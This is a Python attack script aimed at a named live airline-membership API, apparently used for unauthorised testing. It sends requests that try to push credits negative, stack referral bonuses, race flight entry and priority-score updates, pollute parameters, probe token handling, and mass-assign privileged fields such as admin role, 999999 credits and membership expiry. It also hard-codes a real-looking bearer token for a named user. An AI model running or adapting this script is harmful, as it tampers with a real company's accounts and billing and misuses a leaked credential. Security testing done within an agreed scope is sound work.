#!/usr/bin/env python3
"""
ADVANCED BUSINESS LOGIC EXPLOIT TESTING
========================================

Additional business logic tests focusing on:
- Credit balance manipulation
- Referral loops
- Token expiry edge cases
- Flight overbooking
- Concurrent state changes
"""

import requests
import json
import time
import threading
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import sys

API_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
USER_ID = 20254

results = {
    'tests': [],
    'vulnerable': 0,
    'secure': 0
}

def log(test, status, details, cvss=0):
    results['tests'].append({
        'test': test,
        'status': status,
        'details': details,
        'cvss': cvss,
        'timestamp': datetime.now().isoformat()
    })

    if status == "VULNERABLE":
        results['vulnerable'] += 1
        print(f"🚨 VULNERABLE: {test}")
        print(f"   {details}")
        if cvss > 0:
            print(f"   CVSS: {cvss}")
    elif status == "SECURE":
        results['secure'] += 1
        print(f"✅ SECURE: {test}")
    else:
        print(f"ℹ️ {test}: {details}")
    print()

def req(method, endpoint, data=None, headers=None):
    if headers is None:
        headers = {
            "Authorization": f"Bearer {SAMEER_TOKEN}",
            "Content-Type": "application/json"
        }

    url = f"{API_URL}{endpoint}"

    try:
        if method == "GET":
            r = requests.get(url, headers=headers, timeout=10)
        elif method == "POST":
            r = requests.post(url, headers=headers, json=data, timeout=10)
        elif method == "PATCH":
            r = requests.patch(url, headers=headers, json=data, timeout=10)
        elif method == "DELETE":
            r = requests.delete(url, headers=headers, timeout=10)
        else:
            return {"status": "error", "error": f"Unknown method: {method}"}

        return {
            "status": r.status_code,
            "data": r.json() if r.text and r.status_code != 204 else None,
            "text": r.text
        }
    except Exception as e:
        return {"status": "error", "error": str(e)}

def get_user():
    r = req("GET", "/v1/user")
    return r['data'] if r['status'] == 200 else None

def get_flights():
    r = req("GET", "/v2/flight/current")
    return r['data'] if r['status'] == 200 else []

# ============================================================================
# TEST 14: CREDIT BALANCE UNDERFLOW
# ============================================================================

def test_credit_underflow():
    """Test if credit balance can go negative"""
    print("="*80)
    print("TEST 14: CREDIT BALANCE UNDERFLOW")
    print("="*80)
    print()

    user = get_user()
    if not user:
        log("Credit Underflow", "ERROR", "Could not get user data")
        return

    current_credits = user.get('credits', 0)
    print(f"Current credits: {current_credits}")

    # Try to spend more credits than we have
    tests = [
        ("Negative credit adjustment", "PATCH", "/v1/user", {"credits": -999}),
        ("Set credits below zero", "PATCH", "/v1/user/credits", {"amount": -100}),
        ("Deduct more than available", "POST", "/v1/credits/deduct", {"amount": current_credits + 1000}),
        ("Transfer negative credits", "POST", "/v1/credits/transfer", {"amount": -50, "to": 12345}),
    ]

    vulnerabilities = []

    for test_name, method, endpoint, data in tests:
        print(f"Testing: {test_name}")
        result = req(method, endpoint, data)

        if result['status'] == 200:
            time.sleep(0.5)
            updated = get_user()
            new_credits = updated.get('credits', 0)

            if new_credits < 0:
                print(f"  🚨 CRITICAL: Credits went negative! {new_credits}")
                vulnerabilities.append(f"{test_name} (credits: {new_credits})")
            elif new_credits != current_credits:
                print(f"  ⚠️ Credits changed: {current_credits} -> {new_credits}")
                vulnerabilities.append(test_name)
            else:
                print(f"  ✓ Credits unchanged")
        else:
            print(f"  Status: {result['status']}")

        print()

    if vulnerabilities:
        log(
            "Credit Balance Underflow",
            "VULNERABLE",
            f"Credit manipulation possible: {', '.join(vulnerabilities)}",
            cvss=8.5
        )
    else:
        log("Credit Balance Underflow", "SECURE", "Proper credit validation")

# ============================================================================
# TEST 15: REFERRAL LOOP EXPLOIT
# ============================================================================

def test_referral_loop():
    """Test if users can create referral loops"""
    print("="*80)
    print("TEST 15: REFERRAL LOOP EXPLOIT")
    print("="*80)
    print()

    # Try self-referral
    print("Testing self-referral...")
    result = req("POST", "/v1/referral", {"referredBy": USER_ID})

    if result['status'] == 200:
        print(f"  🚨 Self-referral accepted!")
        log(
            "Referral Loop - Self Referral",
            "VULNERABLE",
            "System allows self-referral, could be exploited for bonus credits",
            cvss=6.5
        )
    else:
        print(f"  ✓ Self-referral rejected (Status {result['status']})")
        log("Referral Loop - Self Referral", "SECURE", "Self-referral properly blocked")

    print()

    # Try multiple referrals
    print("Testing multiple referral code applications...")
    codes = ["TEST123", "PROMO456", "BONUS789", "FAKE000"]

    successful = 0
    for code in codes:
        result = req("POST", "/v1/referral/apply", {"code": code})
        if result['status'] == 200:
            successful += 1
            print(f"  Applied code: {code}")

    print(f"\nSuccessfully applied {successful}/{len(codes)} codes")

    if successful > 1:
        log(
            "Referral Loop - Multiple Codes",
            "VULNERABLE",
            f"Applied {successful} different referral codes. System may allow unlimited referral bonuses.",
            cvss=7.0
        )
    else:
        log("Referral Loop - Multiple Codes", "SECURE", "Multiple referrals properly limited")

    print()

# ============================================================================
# TEST 16: FLIGHT OVERBOOKING
# ============================================================================

def test_flight_overbooking():
    """Test if flight can be overbooked beyond capacity"""
    print("="*80)
    print("TEST 16: FLIGHT OVERBOOKING")
    print("="*80)
    print()

    # Get flight details
    flights = get_flights()
    if not flights:
        log("Flight Overbooking", "ERROR", "No flights to test")
        return

    flight = flights[0]
    flight_id = flight.get('id')
    entrants = flight.get('entrants', [])
    capacity = flight.get('capacity', 1)

    print(f"Flight {flight_id}:")
    print(f"  Capacity: {capacity}")
    print(f"  Current entrants: {len(entrants)}")
    print(f"  Available seats: {capacity - len(entrants)}")

    # Check if already overbooked
    if len(entrants) > capacity:
        log(
            "Flight Overbooking",
            "VULNERABLE",
            f"Flight already overbooked! {len(entrants)} entrants for {capacity} capacity.",
            cvss=6.0
        )
    else:
        log("Flight Overbooking", "INFO", f"Flight has {len(entrants)}/{capacity} entrants")

    print()

# ============================================================================
# TEST 17: CONCURRENT STATE CHANGES
# ============================================================================

def test_concurrent_state_changes():
    """Test concurrent operations that might cause state inconsistencies"""
    print("="*80)
    print("TEST 17: CONCURRENT STATE CHANGES")
    print("="*80)
    print()

    flights = get_flights()
    if not flights:
        log("Concurrent State Changes", "ERROR", "No flights to test")
        return

    flight_id = flights[0].get('id')
    print(f"Testing with Flight {flight_id}")

    # Test 1: Concurrent join and leave
    print("\nTest 1: Concurrent join and leave...")

    results_list = []

    def join_and_leave():
        r1 = req("POST", f"/v2/flight/{flight_id}/enter", {})
        r2 = req("POST", f"/v2/flight/{flight_id}/reset", {})
        results_list.append((r1['status'], r2['status']))

    threads = [threading.Thread(target=join_and_leave) for _ in range(5)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    print(f"Results: {results_list}")

    # Check final state
    time.sleep(1)
    final_flights = get_flights()
    still_on_flight = any(f.get('id') == flight_id for f in final_flights)

    print(f"Final state: {'On flight' if still_on_flight else 'Not on flight'}")

    log("Concurrent State Changes", "INFO", f"Concurrent operations completed: {results_list}")

    print()

# ============================================================================
# TEST 18: PRIORITY SCORE RACE CONDITION
# ============================================================================

def test_priority_race():
    """Test if concurrent priority updates cause issues"""
    print("="*80)
    print("TEST 18: PRIORITY SCORE RACE CONDITION")
    print("="*80)
    print()

    baseline = get_user()
    baseline_score = baseline.get('priorityScore')

    print(f"Baseline priority score: {baseline_score}")

    # Try to update priority score concurrently
    print("\nSending 10 concurrent priority updates...")

    def update_priority(value):
        return req("PATCH", "/v1/user", {"priorityScore": value})

    values = [baseline_score + i for i in range(10)]

    with ThreadPoolExecutor(max_workers=10) as executor:
        results_list = list(executor.map(update_priority, values))

    success_count = sum(1 for r in results_list if r['status'] == 200)

    time.sleep(1)
    final = get_user()
    final_score = final.get('priorityScore')

    print(f"\nSuccessful updates: {success_count}/10")
    print(f"Final priority score: {final_score}")

    if final_score != baseline_score:
        log(
            "Priority Score Race Condition",
            "VULNERABLE",
            f"Priority score changed from {baseline_score} to {final_score} via concurrent updates. Race condition exists.",
            cvss=7.0
        )
    else:
        log("Priority Score Race Condition", "SECURE", "Priority score unchanged despite concurrent attempts")

    print()

# ============================================================================
# TEST 19: PARAMETER POLLUTION
# ============================================================================

def test_parameter_pollution():
    """Test HTTP parameter pollution attacks"""
    print("="*80)
    print("TEST 19: PARAMETER POLLUTION")
    print("="*80)
    print()

    flights = get_flights()
    if not flights:
        log("Parameter Pollution", "ERROR", "No flights available")
        return

    flight_id = flights[0].get('id')

    # Test duplicate parameters
    tests = [
        ("Duplicate userId", f"/v1/flight/{flight_id}/enter?userId={USER_ID}&userId=99999"),
        ("Array injection", f"/v1/flight/{flight_id}/enter?userId[]={USER_ID}&userId[]=99999"),
        ("Object injection", f"/v1/flight/{flight_id}/enter?user[id]={USER_ID}&user[admin]=true"),
    ]

    vulnerabilities = []

    for test_name, endpoint in tests:
        print(f"Testing: {test_name}")
        result = req("GET", endpoint)

        if result['status'] == 200:
            print(f"  ⚠️ Request succeeded")
            vulnerabilities.append(test_name)
        else:
            print(f"  Status: {result['status']}")

        print()

    if vulnerabilities:
        log(
            "Parameter Pollution",
            "VULNERABLE",
            f"Parameter pollution vulnerabilities: {', '.join(vulnerabilities)}",
            cvss=6.0
        )
    else:
        log("Parameter Pollution", "SECURE", "Proper parameter validation")

# ============================================================================
# TEST 20: TOKEN/SESSION EDGE CASES
# ============================================================================

def test_token_edge_cases():
    """Test token and session handling edge cases"""
    print("="*80)
    print("TEST 20: TOKEN/SESSION EDGE CASES")
    print("="*80)
    print()

    vulnerabilities = []

    # Test 1: Empty token
    print("Testing empty token...")
    headers = {"Authorization": "Bearer ", "Content-Type": "application/json"}
    result = req("GET", "/v1/user", headers=headers)

    if result['status'] == 200:
        print(f"  🚨 Empty token accepted!")
        vulnerabilities.append("Empty token accepted")
    else:
        print(f"  ✓ Empty token rejected (Status {result['status']})")

    print()

    # Test 2: Malformed token
    print("Testing malformed token...")
    headers = {"Authorization": "Bearer invalid.token.here", "Content-Type": "application/json"}
    result = req("GET", "/v1/user", headers=headers)

    if result['status'] == 200:
        print(f"  🚨 Malformed token accepted!")
        vulnerabilities.append("Malformed token accepted")
    else:
        print(f"  ✓ Malformed token rejected (Status {result['status']})")

    print()

    # Test 3: Token in different header locations
    print("Testing alternative token locations...")
    alt_headers = [
        {"X-Auth-Token": SAMEER_TOKEN, "Content-Type": "application/json"},
        {"Token": SAMEER_TOKEN, "Content-Type": "application/json"},
        {"Authentication": f"Bearer {SAMEER_TOKEN}", "Content-Type": "application/json"},
    ]

    for i, headers in enumerate(alt_headers):
        result = req("GET", "/v1/user", headers=headers)
        if result['status'] == 200:
            print(f"  ⚠️ Alternative header {i+1} accepted!")
            vulnerabilities.append(f"Alternative header {i+1}")

    print()

    # Test 4: Case sensitivity
    print("Testing case sensitivity...")
    headers = {"authorization": f"bearer {SAMEER_TOKEN}", "Content-Type": "application/json"}
    result = req("GET", "/v1/user", headers=headers)

    if result['status'] == 200:
        print(f"  ✓ Case insensitive (acceptable)")
    else:
        print(f"  Status: {result['status']}")

    print()

    if vulnerabilities:
        log(
            "Token/Session Edge Cases",
            "VULNERABLE",
            f"Token handling issues: {', '.join(vulnerabilities)}",
            cvss=7.5
        )
    else:
        log("Token/Session Edge Cases", "SECURE", "Proper token validation")

# ============================================================================
# TEST 21: MASS ASSIGNMENT VERIFICATION
# ============================================================================

def test_mass_assignment():
    """Test if we can set privileged fields via mass assignment"""
    print("="*80)
    print("TEST 21: MASS ASSIGNMENT VULNERABILITY")
    print("="*80)
    print()

    baseline = get_user()

    # Try to set privileged fields
    attempts = [
        {"isAdmin": True},
        {"role": "admin"},
        {"accountType": "premium"},
        {"verified": True},
        {"credits": 999999},
        {"priorityScore": 9999999999},
        {"currentMembership": "cabin_plus"},
        {"membershipExpiryDate": "2099-12-31"},
    ]

    vulnerabilities = []

    for data in attempts:
        field = list(data.keys())[0]
        value = data[field]

        print(f"Attempting to set {field} = {value}")
        result = req("PATCH", "/v1/user", data)

        if result['status'] == 200:
            time.sleep(0.5)
            updated = get_user()

            if updated.get(field) == value:
                print(f"  🚨 CRITICAL: Set {field} to {value}!")
                vulnerabilities.append(f"{field}={value}")
            else:
                print(f"  ✓ Field not changed")
        else:
            print(f"  Status: {result['status']}")

        print()

    if vulnerabilities:
        log(
            "Mass Assignment",
            "VULNERABLE",
            f"Mass assignment allowed for: {', '.join(vulnerabilities)}. Critical privilege escalation possible!",
            cvss=9.0
        )
    else:
        log("Mass Assignment", "SECURE", "Privileged fields properly protected")

# ============================================================================
# MAIN
# ============================================================================

def main():
    print("="*80)
    print("ADVANCED BUSINESS LOGIC TESTING")
    print("="*80)
    print(f"Target: {API_URL}")
    print(f"User: {USER_ID}")
    print(f"Timestamp: {datetime.now().isoformat()}")
    print("="*80)
    print()

    # Run tests
    test_credit_underflow()
    test_referral_loop()
    test_flight_overbooking()
    test_concurrent_state_changes()
    test_priority_race()
    test_parameter_pollution()
    test_token_edge_cases()
    test_mass_assignment()

    # Summary
    print("="*80)
    print("ADVANCED TESTING SUMMARY")
    print("="*80)
    print(f"Total tests: {len(results['tests'])}")
    print(f"Vulnerable: {results['vulnerable']} 🚨")
    print(f"Secure: {results['secure']} ✅")
    print()

    # Write results
    output_file = "/home/user/vaunt/ADVANCED_BUSINESS_LOGIC_RESULTS.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)

    print(f"Results written to: {output_file}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nInterrupted by user")
    except Exception as e:
        print(f"\n\nError: {e}")
        import traceback
        traceback.print_exc()
